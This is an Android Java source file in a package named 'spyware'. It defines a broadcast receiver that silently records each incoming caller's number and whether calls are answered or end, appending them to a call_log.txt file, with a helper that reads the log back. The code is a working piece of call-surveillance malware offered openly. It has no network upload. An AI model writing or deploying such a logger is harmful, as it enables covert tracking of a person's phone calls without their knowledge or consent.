package com.example.spyware;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.IOException;

public class PhoneStateReceiver extends BroadcastReceiver {

    private static final String TAG = "PhoneStateReceiver";
    private static final String FILE_NAME = "call_log.txt";

    @Override
    public void onReceive(Context context, Intent intent) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            String log = "Incoming call from: " + incomingNumber + "\n";
            writeLogToFile(context, log);
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            writeLogToFile(context, "Call answered\n");
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            writeLogToFile(context, "Call ended or missed\n");
        }
    }

    private void writeLogToFile(Context context, String content) {
        try {
            File dir = context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS);
            if (dir != null && !dir.exists()) {
                dir.mkdirs();
            }
            File file = new File(dir, FILE_NAME);
            FileOutputStream fos = new FileOutputStream(file, true); // Append mode
            fos.write(content.getBytes());
            fos.close();
            Log.d(TAG, "Written to file: " + content.trim());
        } catch (IOException e) {
            Log.e(TAG, "Error writing to file", e);
        }
    }

    // Optional: Call this method to read the file content
    public static void readLogFromFile(Context context) {
        try {
            File dir = context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS);
            File file = new File(dir, FILE_NAME);
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;
            Log.d(TAG, "Call Log Contents:");
            while ((line = br.readLine()) != null) {
                Log.d(TAG, line);
            }
            br.close();
        } catch (IOException e) {
            Log.e(TAG, "Error reading file", e);
        }
    }
}
